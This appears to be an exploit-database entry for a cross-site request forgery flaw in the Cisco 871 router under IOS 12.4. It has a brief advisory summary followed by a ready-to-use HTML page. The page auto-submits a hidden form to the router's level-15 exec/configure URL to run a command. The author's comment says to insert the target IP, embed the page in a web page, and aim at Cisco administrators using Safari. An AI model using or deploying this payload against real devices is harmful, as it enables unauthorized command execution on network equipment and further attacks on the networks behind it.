source: https://www.securityfocus.com/bid/31218/info
 
The Cisco 871 Integrated Services Router is prone to a cross-site request-forgery vulnerability.
 
Successful exploits can run arbitrary commands on affected devices. This may lead to further network-based attacks.
 
The 871 Integrated Services Router under IOS 12.4 is vulnerable; other products and versions may also be affected. 

<!-- Jeremy Brown [0xjbrown41@gmail.com/http://jbrownsec.blogspot.com] Cisco Router HTTP Administration CSRF Remote Command Execution Universal Exploit #2 Replace "example.com" with the IP address of the target router, embed this in a web page and hope for the best. Cisco Admin's + Safari are the best targets ;) --> <html> <body> <body onload="fdsa.submit();"> <form name=fdsa method="post" action="http://example.com/level/15/exec/-/configure/http"> <input type=hidden name=command value="alias exec xx xx"> <input type=hidden name=command_url value="/level/15/exec/-"> <input type=hidden name=new_command_url value="/level/15/configure/-"> </body> </html>